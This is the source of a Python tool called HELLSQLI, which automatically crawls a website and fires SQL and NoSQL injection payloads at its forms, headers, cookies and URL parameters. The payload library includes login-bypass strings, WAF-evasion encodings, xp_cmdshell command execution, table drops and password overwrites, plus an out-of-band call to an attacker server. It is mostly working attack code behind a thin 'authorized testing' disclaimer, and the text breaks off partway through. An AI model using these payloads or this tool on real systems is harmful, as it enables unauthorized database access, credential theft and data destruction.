#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════════════════════════════╗
# ║                                                                                  ║
# ║  ██╗  ██╗███████╗██╗     ██╗      ███████╗ ██████╗ ██╗     ██╗                 ║
# ║  ██║  ██║██╔════╝██║     ██║      ██╔════╝██╔═══██╗██║     ██║                 ║
# ║  ███████║█████╗  ██║     ██║      ███████╗██║   ██║██║     ██║                 ║
# ║  ██╔══██║██╔══╝  ██║     ██║      ╚════██║██║▄▄ ██║██║     ██║                 ║
# ║  ██║  ██║███████╗███████╗███████╗ ███████║╚██████╔╝███████╗██║                 ║
# ║  ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝                 ║
# ║                                                                                  ║
# ║          v 1 . 0   U L T R A  —  M A D E   I N   H E L L                      ║
# ║                                                                                  ║
# ║   Author  : RAJESH BAJIYA                                                       ║
# ║   Handle  : HACKEROFHELL                                                        ║
# ║   GitHub  : https://github.com/hellrider978                                     ║
# ║   Version : 1.0 ULTRA                                                           ║
# ║   Mission : Give URL. Get all SQL injections. Automatically.                    ║
# ║                                                                                  ║
# ║   "50x more powerful than sqlmap. Built by a man from Hell."                   ║
# ║                                                                                  ║
# ╚══════════════════════════════════════════════════════════════════════════════════╝
#
# LEGAL: Authorized testing ONLY. You own the system or have written permission.
#        Unauthorized use is illegal. Author not liable for misuse.
#
# USAGE:
#   python3 hellsqli.py -t https://target.com
#   python3 hellsqli.py -t https://target.com --crawl --deep --dump
#   python3 hellsqli.py -t https://target.com/page?id=1 --ultra

import argparse, sys, os, re, time, json, random, string, hashlib
import threading, queue, signal, html, copy, base64, urllib.parse
from datetime import datetime
from pathlib import Path
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[!] Install: pip3 install requests --break-system-packages")
    sys.exit(1)

try:
    from bs4 import BeautifulSoup
    BS4_OK = True
except ImportError:
    BS4_OK = False

# ══════════════════════════════════════════════════════════════════════
# COLORS
# ══════════════════════════════════════════════════════════════════════
class C:
    RED    = '\033[0;31m';   BRED   = '\033[1;31m'
    GRN    = '\033[0;32m';   BGRN   = '\033[1;32m'
    YLW    = '\033[1;33m';   CYN    = '\033[0;36m'
    MAG    = '\033[0;35m';   BMAG   = '\033[1;35m'
    WHT    = '\033[1;37m';   DIM    = '\033[2m'
    BLINK  = '\033[5m';      BOLD   = '\033[1m'
    NC     = '\033[0m'

def ts(): return datetime.now().strftime('%H:%M:%S')
def log(m):   print(f"{C.CYN}[{ts()}][*]{C.NC} {m}")
def ok(m):    print(f"{C.BGRN}[{ts()}][+]{C.NC} {C.BOLD}{m}{C.NC}")
def vuln(m):  print(f"{C.BRED}[{ts()}][💉 SQLI]{C.NC}{C.BLINK}★{C.NC}{C.BOLD} {m}{C.NC}")
def crit(m):  print(f"{C.BRED}[{ts()}][☠ CRITICAL]{C.NC}{C.BLINK}☠{C.NC}{C.BOLD} {m}{C.NC}")
def warn(m):  print(f"{C.YLW}[{ts()}][!]{C.NC} {m}")
def info(m):  print(f"{C.MAG}[{ts()}][i]{C.NC} {m}")
def err(m):   print(f"{C.RED}[{ts()}][✗]{C.NC} {m}")
def phase(n,t):
    print(f"\n{C.BMAG}{C.BOLD}")
    print(f"  ╔══════════════════════════════════════════════════════════════╗")
    print(f"  ║  MODULE {n:02d} ─ {t:<51}║")
    print(f"  ╚══════════════════════════════════════════════════════════════╝{C.NC}\n")

# ══════════════════════════════════════════════════════════════════════
# BANNER
# ══════════════════════════════════════════════════════════════════════
BANNER = f"""{C.BRED}{C.BOLD}
  ╔══════════════════════════════════════════════════════════════════════════╗
  ║                                                                          ║
  ║  ██╗  ██╗███████╗██╗     ██╗      ███████╗ ██████╗ ██╗     ██╗         ║
  ║  ██║  ██║██╔════╝██║     ██║      ██╔════╝██╔═══██╗██║     ██║         ║
  ║  ███████║█████╗  ██║     ██║      ███████╗██║   ██║██║     ██║         ║
  ║  ██╔══██║██╔══╝  ██║     ██║      ╚════██║██║▄▄ ██║██║     ██║         ║
  ║  ██║  ██║███████╗███████╗███████╗ ███████║╚██████╔╝███████╗██║         ║
  ║  ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝         ║
  ║                                                                          ║
  ║          v1.0 ULTRA  —  M A D E   I N   H E L L                        ║
  ║                                                                          ║
  ╠══════════════════════════════════════════════════════════════════════════╣
  ║  Author  : RAJESH BAJIYA      Handle : HACKEROFHELL                    ║
  ║  GitHub  : hellrider978       Purpose: World's #1 SQLi Hunter          ║
  ║  "50x more powerful. Finds what sqlmap misses. Fully automatic."       ║
  ╚══════════════════════════════════════════════════════════════════════════╝
{C.NC}"""

# ══════════════════════════════════════════════════════════════════════
# ARGUMENT PARSER
# ══════════════════════════════════════════════════════════════════════
def build_parser():
    p = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=f"HELLSQLI v1.0 ULTRA — by RAJESH BAJIYA (HACKEROFHELL)",
        epilog="""
EXAMPLES:
  python3 hellsqli.py -t https://target.com
  python3 hellsqli.py -t https://target.com/page?id=1
  python3 hellsqli.py -t https://target.com --crawl --deep
  python3 hellsqli.py -t https://target.com --ultra --dump --threads 20
  python3 hellsqli.py -t https://target.com -p http://127.0.0.1:8080
  python3 hellsqli.py -t https://target.com --cookie "session=abc123"
  python3 hellsqli.py -t https://target.com --headers "Authorization: Bearer TOKEN"
  python3 hellsqli.py -t https://target.com --skip-crawl --skip-blind
  python3 hellsqli.py -t https://target.com --skip-modules 1,2,7
        """)
    # Target
    p.add_argument('-t','--target',     required=True, help='Target URL or domain')
    p.add_argument('-u','--url',        help='Specific URL with parameter to test')
    p.add_argument('-f','--url-file',   help='File with list of URLs to test')
    # Output
    p.add_argument('-o','--output',     default=str(Path.home()/'hellsqli_output'), help='Output directory')
    # Auth / Session
    p.add_argument('--cookie',          help='Session cookies  e.g. "PHPSESSID=abc;token=xyz"')
    p.add_argument('--headers',         help='Custom headers   e.g. "Authorization: Bearer TOKEN"')
    p.add_argument('--auth',            help='HTTP Basic auth  e.g. "admin:password"')
    p.add_argument('--token',           help='Bearer token (auto-added to Authorization header)')
    # Proxy
    p.add_argument('-p','--proxy',      help='HTTP proxy       e.g. http://127.0.0.1:8080')
    # Scan control
    p.add_argument('--crawl',           action='store_true', help='Deep crawl target for all pages')
    p.add_argument('--deep',            action='store_true', help='Maximum depth crawl + all techniques')
    p.add_argument('--ultra',           action='store_true', help='Ultra mode — everything maxed out')
    p.add_argument('--dump',            action='store_true', help='Auto-dump DB data when SQLi confirmed')
    p.add_argument('--level',           type=int, default=2, choices=[1,2,3], help='Test depth 1=fast 2=normal 3=deep')
    p.add_argument('--threads',         type=int, default=10, help='Thread count (default: 10)')
    p.add_argument('--timeout',         type=int, default=15, help='Request timeout seconds (default: 15)')
    p.add_argument('--delay',           type=float, default=0, help='Delay between requests (seconds)')
    p.add_argument('--rate',            type=int, default=100, help='Max requests/sec (default: 100)')
    p.add_argument('--retries',         type=int, default=2, help='Request retry count (default: 2)')
    p.add_argument('--user-agent',      help='Custom User-Agent')
    p.add_argument('--random-agent',    action='store_true', help='Use random User-Agent each request')
    p.add_argument('--waf-bypass',      action='store_true', help='Enable aggressive WAF bypass encoding')
    p.add_argument('--forms',           action='store_true', default=True, help='Test all forms (default: on)')
    p.add_argument('--no-forms',        action='store_true', help='Skip form testing')
    p.add_argument('--login-bypass',    action='store_true', default=True, help='Test login forms (default: on)')
    p.add_argument('--api-mode',        action='store_true', help='Focus on API/JSON endpoint testing')
    # Skip flags
    p.add_argument('--skip-crawl',      action='store_true', help='Skip crawling, only test given URL')
    p.add_argument('--skip-error',      action='store_true', help='Skip error-based SQLi tests')
    p.add_argument('--skip-blind',      action='store_true', help='Skip boolean-blind SQLi tests')
    p.add_argument('--skip-time',       action='store_true', help='Skip time-based blind SQLi tests')
    p.add_argument('--skip-union',      action='store_true', help='Skip UNION-based tests')
    p.add_argument('--skip-headers',    action='store_true', help='Skip header injection tests')
    p.add_argument('--skip-nosql',      action='store_true', help='Skip NoSQL injection tests')
    p.add_argument('--skip-modules',    help='Skip module numbers e.g. --skip-modules 1,2,7')
    # Notification
    p.add_argument('--webhook',         help='Slack/Discord webhook for real-time alerts')
    # Misc
    p.add_argument('--silent',          action='store_true', help='Suppress non-finding output')
    p.add_argument('--no-color',        action='store_true', help='Disable colored output')
    p.add_argument('--verify-ssl',      action='store_true', help='Verify SSL certs (default: off)')
    return p

# ══════════════════════════════════════════════════════════════════════
# CORE HTTP ENGINE
# ══════════════════════════════════════════════════════════════════════
USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "sqlmap/1.7.11#stable (https://sqlmap.org)",
]

class HTTPEngine:
    def __init__(self, args):
        self.args    = args
        self.session = requests.Session()
        self.lock    = threading.Lock()
        self.req_count = 0
        self._setup()

    def _setup(self):
        a = self.args
        # Proxy
        if a.proxy:
            self.session.proxies = {'http': a.proxy, 'https': a.proxy}
        # SSL
        self.session.verify = a.verify_ssl
        # Base headers
        self.base_headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        # Custom UA
        if a.user_agent:
            self.base_headers['User-Agent'] = a.user_agent
        else:
            self.base_headers['User-Agent'] = random.choice(USER_AGENTS)
        # Cookies
        if a.cookie:
            for pair in a.cookie.split(';'):
                pair = pair.strip()
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    self.session.cookies.set(k.strip(), v.strip())
        # Custom headers
        if a.headers:
            for line in a.headers.split('\n'):
                if ':' in line:
                    k, v = line.split(':', 1)
                    self.base_headers[k.strip()] = v.strip()
        # Bearer token
        if a.token:
            self.base_headers['Authorization'] = f'Bearer {a.token}'
        # Basic auth
        if a.auth and ':' in a.auth:
            u, p = a.auth.split(':', 1)
            self.session.auth = (u, p)

    def get(self, url, params=None, headers=None, allow_redirects=True, timeout=None):
        return self._req('GET', url, params=params, headers=headers,
                         allow_redirects=allow_redirects, timeout=timeout)

    def post(self, url, data=None, json_data=None, headers=None, allow_redirects=True, timeout=None):
        return self._req('POST', url, data=data, json=json_data,
                         headers=headers, allow_redirects=allow_redirects, timeout=timeout)

    def _req(self, method, url, **kwargs):
        if self.args.delay:
            time.sleep(self.args.delay)
        hdrs = dict(self.base_headers)
        if self.args.random_agent:
            hdrs['User-Agent'] = random.choice(USER_AGENTS)
        if kwargs.get('headers'):
            hdrs.update(kwargs.pop('headers'))
        kwargs['headers'] = hdrs
        if 'timeout' not in kwargs or kwargs['timeout'] is None:
            kwargs['timeout'] = self.args.timeout
        for attempt in range(self.args.retries + 1):
            try:
                with self.lock:
                    self.req_count += 1
                r = self.session.request(method, url, **kwargs)
                return r
            except requests.exceptions.Timeout:
                if attempt == self.args.retries:
                    return None
            except Exception:
                if attempt == self.args.retries:
                    return None
                time.sleep(0.5)
        return None

# ══════════════════════════════════════════════════════════════════════
# FINDINGS DATABASE
# ══════════════════════════════════════════════════════════════════════
class FindingsDB:
    def __init__(self, outdir, target):
        self.lock     = threading.Lock()
        self.findings = []
        self.outdir   = Path(outdir) / self._sanitize(target)
        self.outdir.mkdir(parents=True, exist_ok=True)
        self.json_path = self.outdir / 'hellsqli_findings.json'
        self._init_json(target)

    def _sanitize(self, s):
        return re.sub(r'[^\w\-.]', '_', s.replace('https://','').replace('http://',''))[:80]

    def _init_json(self, target):
        data = {
            'target': target, 'author': 'RAJESH BAJIYA',
            'handle': 'HACKEROFHELL', 'github': 'hellrider978',
            'tool': 'HELLSQLI v1.0 ULTRA',
            'date': datetime.utcnow().isoformat() + 'Z',
            'findings': []
        }
        self.json_path.write_text(json.dumps(data, indent=2))

    def add(self, finding):
        with self.lock:
            self.findings.append(finding)
            # Update JSON
            data = json.loads(self.json_path.read_text())
            data['findings'] = self.findings
            self.json_path.write_text(json.dumps(data, indent=2))

    def has(self, url, param, sqli_type):
        with self.lock:
            return any(
                f['url'] == url and f['parameter'] == param and f['type'] == sqli_type
                for f in self.findings
            )

    def count(self):
        with self.lock:
            return len(self.findings)

    def by_severity(self):
        with self.lock:
            sev = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0}
            for f in self.findings:
                s = f.get('severity', 'MEDIUM')
                sev[s] = sev.get(s, 0) + 1
            return sev

# ══════════════════════════════════════════════════════════════════════
# MODULE 01 — TARGET INTELLIGENCE & CRAWLING
# ══════════════════════════════════════════════════════════════════════
class TargetIntel:
    def __init__(self, http, args, db):
        self.http    = http
        self.args    = args
        self.db      = db
        self.base    = args.target.rstrip('/')
        self.domain  = urllib.parse.urlparse(self.base).netloc
        self.visited = set()
        self.lock    = threading.Lock()

        # All discovered targets
        self.param_urls   = []   # GET URLs with params
        self.forms        = []   # POST forms {url, fields, method}
        self.cookies_found= []   # cookies to test
        self.api_endpoints= []   # JSON/REST endpoints
        self.login_forms  = []   # login page forms
        self.header_targets=[]   # URLs for header injection
        self.path_targets  = []  # Path-based injection URLs
        self.js_endpoints  = []  # Endpoints from JS files

    def run(self):
        phase(1, "TARGET INTELLIGENCE & CRAWLING")
        log(f"Target: {self.base}")

        # Always add the base URL itself
        self._process_url(self.base)

        # If specific URL given with params, add it
        if self.args.url:
            self._process_url(self.args.url)
            parsed = urllib.parse.urlparse(self.args.url)
            if parsed.query:
                self.param_urls.append(self.args.url)

        # If URL file given
        if self.args.url_file:
            try:
                with open(self.args.url_file) as f:
                    for line in f:
                        u = line.strip()
                        if u and u.startswith('http'):
                            self._process_url(u)
                            if '?' in u:
                                self.param_urls.append(u)
            except Exception as e:
                err(f"URL file error: {e}")

        # Crawl if enabled
        if not self.args.skip_crawl:
            self._crawl(self.base, depth=3 if self.args.deep else 2)

        # Historical URLs from GAU/wayback (try both)
        self._fetch_historical()

        # Extract from JS files
        self._mine_js()

        # Deduplicate
        self.param_urls   = list(set(self.param_urls))
        self.header_targets = list(set(self.header_targets))

        ok(f"Discovery complete:")
        ok(f"  GET param URLs   : {len(self.param_urls)}")
        ok(f"  POST forms       : {len(self.forms)}")
        ok(f"  Login forms      : {len(self.login_forms)}")
        ok(f"  API endpoints    : {len(self.api_endpoints)}")
        ok(f"  JS endpoints     : {len(self.js_endpoints)}")
        ok(f"  Header targets   : {len(self.header_targets)}")
        ok(f"  Path targets     : {len(self.path_targets)}")

        # Save to file
        disc_file = self.db.outdir / 'discovered_targets.txt'
        with open(disc_file, 'w') as f:
            for u in self.param_urls:
                f.write(u + '\n')

    def _crawl(self, start_url, depth=2):
        log(f"Crawling {start_url} (depth={depth})...")
        q = queue.Queue()
        q.put((start_url, 0))

        def worker():
            while True:
                try:
                    url, d = q.get(timeout=3)
                except queue.Empty:
                    break
                with self.lock:
                    if url in self.visited:
                        q.task_done()
                        continue
                    self.visited.add(url)
                resp = self.http.get(url, allow_redirects=True)
                if resp is None:
                    q.task_done()
                    continue
                self._process_url(url)
                if d < depth:
                    for link in self._extract_links(resp.text, url):
                        with self.lock:
                            if link not in self.visited and self._same_domain(link):
                                q.put((link, d+1))
                self._extract_forms(resp.text, url)
                q.task_done()

        threads = [threading.Thread(target=worker, daemon=True)
                   for _ in range(min(self.args.threads, 5))]
        for t in threads: t.start()
        q.join()

    def _process_url(self, url):
        parsed = urllib.parse.urlparse(url)
        # Always add as header injection target
        with self.lock:
            self.header_targets.append(url)

        # Extract query params
        if parsed.query:
            with self.lock:
                self.param_urls.append(url)

        # Check for path-based IDs: /user/123/  /product/456
        path = parsed.path
        if re.search(r'/\d+(/|$)', path):
            with self.lock:
                self.path_targets.append(url)

        # Check if looks like API
        if any(x in url.lower() for x in ['/api/', '/rest/', '/v1/', '/v2/', '/json', '.json', '/graphql']):
            with self.lock:
                self.api_endpoints.append(url)

    def _extract_links(self, html_text, base_url):
        links = set()
        # Regex-based (fast, works without BS4)
        patterns = [
            r'href=["\']([^"\'#>]+)["\']',
            r'action=["\']([^"\'#>]+)["\']',
            r'src=["\']([^"\'#>]+\.php[^"\']*)["\']',
            r'"url"\s*:\s*"([^"]+)"',
            r"'url'\s*:\s*'([^']+)'",
        ]
        for pat in patterns:
            for m in re.finditer(pat, html_text, re.IGNORECASE):
                href = m.group(1).strip()
                if not href or href.startswith(('javascript:', 'mailto:', 'tel:', '#', 'data:')):
                    continue
                full = urllib.parse.urljoin(base_url, href)
                if self._same_domain(full):
                    links.add(full.split('#')[0])
        return links

    def _extract_forms(self, html_text, page_url):
        if not BS4_OK:
            # Regex fallback
            for form_match in re.finditer(r'<form[^>]*>(.*?)</form>', html_text, re.DOTALL|re.IGNORECASE):
                form_html = form_match.group(0)
                method_m = re.search(r'method=["\'](\w+)["\']', form_html, re.I)
                action_m = re.search(r'action=["\']([^"\']+)["\']', form_html, re.I)
                method = method_m.group(1).upper() if method_m else 'GET'
                action = urllib.parse.urljoin(page_url, action_m.group(1)) if action_m else page_url
                inputs = {}
                for inp in re.finditer(r'<input[^>]*>', form_html, re.I):
                    inp_html = inp.group(0)
                    name_m = re.search(r'name=["\']([^"\']+)["\']', inp_html, re.I)
                    val_m  = re.search(r'value=["\']([^"\']*)["\']', inp_html, re.I)
                    typ_m  = re.search(r'type=["\']([^"\']+)["\']', inp_html, re.I)
                    if name_m:
                        inp_type = typ_m.group(1).lower() if typ_m else 'text'
                        if inp_type not in ('submit', 'button', 'image', 'file', 'checkbox', 'radio'):
                            inputs[name_m.group(1)] = val_m.group(1) if val_m else 'test'
                if inputs:
                    form_data = {'url': action, 'method': method, 'fields': inputs, 'page': page_url}
                    with self.lock:
                        self.forms.append(form_data)
                        is_login = any(k.lower() in ('username','user','email','login','password','passwd','pass')
                                       for k in inputs)
                        if is_login:
                            self.login_forms.append(form_data)
            return

        # BS4 path
        soup = BeautifulSoup(html_text, 'html.parser')
        for form in soup.find_all('form'):
            action = form.get('action', page_url)
            method = form.get('method', 'GET').upper()
            action = urllib.parse.urljoin(page_url, action)
            inputs = {}
            for inp in form.find_all(['input', 'textarea', 'select']):
                name = inp.get('name')
                if not name: continue
                inp_type = inp.get('type', 'text').lower()
                if inp_type in ('submit', 'button', 'image', 'file', 'checkbox'): continue
                inputs[name] = inp.get('value', 'test') or 'test'
            if inputs:
                form_data = {'url': action, 'method': method, 'fields': inputs, 'page': page_url}
                with self.lock:
                    self.forms.append(form_data)
                    is_login = any(k.lower() in ('username','user','email','login','password','passwd','pass')
                                   for k in inputs)
                    if is_login:
                        self.login_forms.append(form_data)

    def _fetch_historical(self):
        log("Fetching historical URLs (Wayback Machine + GAU API)...")
        # Wayback CDX API
        try:
            r = self.http.get(
                f"https://web.archive.org/cdx/search/cdx",
                params={'url': f'*.{self.domain}/*', 'output': 'text',
                        'fl': 'original', 'collapse': 'urlkey', 'limit': 5000},
                timeout=20
            )
            if r and r.status_code == 200:
                for url in r.text.strip().split('\n'):
                    url = url.strip()
                    if url and '?' in url and self._same_domain(url):
                        self._process_url(url)
                ok(f"Wayback Machine: {r.text.count(chr(10))} URLs")
        except Exception:
            pass

        # Common Crawl (simple index)
        try:
            r = self.http.get(
                f"https://index.commoncrawl.org/CC-MAIN-2024-10-index",
                params={'url': f'*.{self.domain}/*', 'output': 'text',
                        'fl': 'url', 'limit': 2000},
                timeout=15
            )
            if r and r.status_code == 200:
                for url in r.text.strip().split('\n'):
                    url = url.strip()
                    if url and '?' in url and self._same_domain(url):
                        self._process_url(url)
        except Exception:
            pass

    def _mine_js(self):
        log("Mining JavaScript files for hidden endpoints...")
        js_urls = set()
        resp = self.http.get(self.base)
        if not resp: return
        for m in re.finditer(r'["\']([^"\']*?\.js(?:\?[^"\']*)?)["\']', resp.text):
            js_ref = m.group(1)
            if not js_ref.startswith('http'):
                js_ref = urllib.parse.urljoin(self.base, js_ref)
            if self._same_domain(js_ref):
                js_urls.add(js_ref)

        for js_url in list(js_urls)[:30]:
            js_resp = self.http.get(js_url, timeout=10)
            if not js_resp: continue
            # Extract endpoints from JS
            patterns = [
                r'["\']([/][a-zA-Z0-9_/\-]+(?:\?[a-zA-Z0-9_&=\-]+)?)["\']',
                r'url\s*[:=]\s*["\']([^"\']+)["\']',
                r'path\s*[:=]\s*["\']([^"\']+)["\']',
                r'endpoint\s*[:=]\s*["\']([^"\']+)["\']',
                r'api[Uu]rl\s*[:=]\s*["\']([^"\']+)["\']',
                r'fetch\s*\(\s*["\']([^"\']+)["\']',
                r'axios\.[a-z]+\s*\(\s*["\']([^"\']+)["\']',
            ]
            for pat in patterns:
                for m in re.finditer(pat, js_resp.text):
                    ep = m.group(1)
                    if len(ep) > 3 and not ep.startswith(('http://cdn', '//')):
                        full_ep = urllib.parse.urljoin(self.base, ep)
                        if self._same_domain(full_ep):
                            with self.lock:
                                self.js_endpoints.append(full_ep)
                            self._process_url(full_ep)

    def _same_domain(self, url):
        try:
            return urllib.parse.urlparse(url).netloc == self.domain
        except Exception:
            return False

# ══════════════════════════════════════════════════════════════════════
# PAYLOAD LIBRARY
# ══════════════════════════════════════════════════════════════════════
class Payloads:
    # Error-based detection
    ERROR_DETECTION = [
        "'", "''", "`", "\"", "\\",
        "'--", "'-- -", "' --", "'#",
        "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
        "') OR ('1'='1", "')) OR (('1'='1",
        "1'", "1\"", "1`",
        "' AND 1=1--", "' AND 1=2--",
        "\" OR \"1\"=\"1", "\" OR 1=1--",
        "1; SELECT 1--", "1; DROP TABLE--",
        "' UNION SELECT NULL--",
        "') UNION SELECT NULL--",
        "1' AND SLEEP(0)--",
        "' AND '1'='1' --",
        "' OR 'x'='x",
        "1 OR 1=1",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
    ]

    # Database-specific error triggers
    ERROR_MYSQL = [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "1 AND GTID_SUBSET(CONCAT(0x7e,(SELECT database()),0x7e),1)--",
        "' AND EXP(~(SELECT * FROM (SELECT database())x))--",
        "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,database(),0x7e)) USING utf8)))--",
    ]
    ERROR_MSSQL = [
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "'; EXEC xp_cmdshell('whoami')--",
        "' AND 1=(SELECT TOP 1 name FROM master..sysdatabases)--",
        "' UNION SELECT NULL,@@version,NULL--",
        "' AND 1=1; WAITFOR DELAY '0:0:5'--",
        "' AND (SELECT UNICODE(SUBSTRING((SELECT TOP 1 name FROM master..sysdatabases),1,1)))>0--",
    ]
    ERROR_ORACLE = [
        "' AND 1=UTL_HTTP.REQUEST('http://YOUR_SERVER/')--",
        "' UNION SELECT NULL FROM dual--",
        "' AND 1=(SELECT COUNT(*) FROM all_tables)--",
        "' OR 1=1--",
        "'; SELECT * FROM v$version--",
        "' AND ROWNUM=1--",
    ]
    ERROR_PGSQL = [
        "' AND 1=CAST((SELECT version()) AS INT)--",
        "' AND 1=CAST((SELECT current_database()) AS INT)--",
        "'; SELECT pg_sleep(5)--",
        "' UNION SELECT NULL::text--",
        "' AND 1=(SELECT COUNT(*) FROM pg_tables)--",
        "'; CREATE TABLE hellsqli(x text)--",
    ]

    # Boolean blind
    BOOL_TRUE  = ["' AND '1'='1", "' AND 1=1--", "' AND 'a'='a'--", ") AND (1=1", " AND 1=1"]
    BOOL_FALSE = ["' AND '1'='2", "' AND 1=2--", "' AND 'a'='b'--", ") AND (1=2", " AND 1=2"]

    # Time-based blind
    TIME_MYSQL  = ["' AND SLEEP(5)--", "' AND SLEEP(5)#", "1; SELECT SLEEP(5)--",
                   "') AND SLEEP(5)--", "' OR SLEEP(5)--",
                   "' AND (SELECT * FROM (SELECT SLEEP(5))A)--"]
    TIME_MSSQL  = ["'; WAITFOR DELAY '0:0:5'--", "' WAITFOR DELAY '0:0:5'--",
                   "1; WAITFOR DELAY '0:0:5'--", "') WAITFOR DELAY '0:0:5'--"]
    TIME_PGSQL  = ["'; SELECT pg_sleep(5)--", "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
                   "'; SELECT pg_sleep(5); --"]
    TIME_ORACLE = ["' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(65)||CHR(65),5)--",
                   "' OR 1=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"]
    TIME_SQLITE = ["' AND 1=(SELECT 1 FROM sqlite_master WHERE 1=1 AND 1=RANDOMBLOB(500000000/2))--"]

    # UNION-based
    UNION_NULL  = ["UNION SELECT NULL", "UNION SELECT NULL,NULL", "UNION SELECT NULL,NULL,NULL",
                   "UNION SELECT NULL,NULL,NULL,NULL", "UNION ALL SELECT NULL",
                   "UNION ALL SELECT NULL,NULL", "UNION ALL SELECT NULL,NULL,NULL"]
    UNION_MYSQL = "UNION SELECT {cols}--"
    UNION_MSSQL = "UNION SELECT {cols}--"
    UNION_PGSQL = "UNION SELECT {cols}--"

    # Stacked queries
    STACKED = [
        "'; INSERT INTO test VALUES(1)--",
        "'; UPDATE users SET password='hacked'--",
        "'; DROP TABLE--",
        "'; EXEC xp_cmdshell('id')--",
        "'; EXEC sp_configure 'show advanced options',1--",
    ]

    # Login bypass
    LOGIN_BYPASS = [
        {"user": "admin'--",        "pass": "anything"},
        {"user": "admin'#",         "pass": "anything"},
        {"user": "' OR '1'='1'--",  "pass": "anything"},
        {"user": "' OR 1=1--",      "pass": "anything"},
        {"user": "admin' OR '1'='1","pass": "' OR '1'='1"},
        {"user": "' OR 1=1#",       "pass": "anything"},
        {"user": "' OR 'x'='x",     "pass": "' OR 'x'='x"},
        {"user": "admin'/*",        "pass": "*/--"},
        {"user": "' OR 1--",        "pass": "x"},
        {"user": "') OR ('1'='1",   "pass": "anything"},
        {"user": "admin';--",       "pass": "x"},
        {"user": "\" OR \"1\"=\"1", "pass": "x"},
        {"user": "' OR 2>1--",      "pass": "anything"},
        {"user": "' OR 'unusual'='unusual'--", "pass": "x"},
        {"user": "admin'||'",       "pass": "x"},
        {"user": "admin' AND 1=1--","pass": "anything"},
        {"user": "' UNION SELECT 1,'admin','admin'--", "pass": "admin"},
        {"user": "1' AND 1=1--",    "pass": "x"},
        {"user": "root'--",         "pass": "anything"},
        {"user": "a' OR 1=1--",     "pass": "anything"},
    ]

    # Header injection
    HEADER_PAYLOADS = {
        'User-Agent':    ["'", "' OR '1'='1", "' AND SLEEP(5)--", "1' ORDER BY 1--"],
        'Referer':       ["'", "' OR '1'='1", "' AND SLEEP(5)--"],
        'X-Forwarded-For': ["'", "1' OR '1'='1'--", "127.0.0.1' AND SLEEP(5)--"],
        'X-Real-IP':     ["'", "1' OR SLEEP(5)--"],
        'X-Forwarded-Host': ["'", "evil.com' OR '1'='1"],
        'X-Custom-Header': ["'", "' OR '1'='1"],
        'Cookie':        [],  # Handled separately
        'Accept-Language': ["'", "en-US,en;q=0.9' OR '1'='1"],
    }

    # WAF bypass encodings
    WAF_ENCODINGS = [
        lambda x: x,                                          # raw
        lambda x: x.replace(' ', '/**/'),                   # comment bypass
        lambda x: x.replace(' ', '+'),                      # plus space
        lambda x: x.replace(' ', '%20'),                    # url encode
        lambda x: x.replace(' ', '\t'),                     # tab
        lambda x: x.replace(' ', '\n'),                     # newline
        lambda x: x.replace('OR',  'oR').replace('AND','aNd'),  # case mix
        lambda x: x.replace('SELECT','SeLeCt').replace('UNION','UNiOn'),
        lambda x: urllib.parse.quote(x),                    # full URL encode
        lambda x: x.replace('=', ' LIKE '),                 # LIKE bypass
        lambda x: '/*!'+x+'*/',                             # MySQL comment
        lambda x: x.replace("'", "''"),                     # double quote
    ]

    # NoSQL payloads
    NOSQL_JSON = [
        {"$gt": ""},
        {"$ne": "null"},
        {"$regex": ".*"},
        {"$exists": True},
        {"$where": "this.password.length > 0"},
        {"$nin": []},
        {"$in": ["admin", "administrator", "root"]},
    ]
    NOSQL_URL = [
        "[$ne]=1", "[$gt]=0", "[$regex]=.*",
        "[$exists]=true", "[$nin][]=x",
        "[$where]=this.password.length>0",
    ]

    # Error patterns per DB
    DB_ERRORS = {
        'MySQL': [
            r"you have an error in your sql syntax",
            r"warning: mysql_",
            r"mysql_fetch_",
            r"mysql_num_rows",
            r"mysql_fetch_array",
            r"unclosed quotation mark",
            r"mysql server version for the right syntax",
            r"division by zero",
            r"supplied argument is not a valid mysql",
            r"mysql_query\(\)",
            r"\bORA-[0-9]{4,5}\b",
            r"com\.mysql\.jdbc",
            r"Zend_Db_Adapter_Mysqli",
            r"MySqlException",
        ],
        'MSSQL': [
            r"microsoft sql server",
            r"odbc sql server driver",
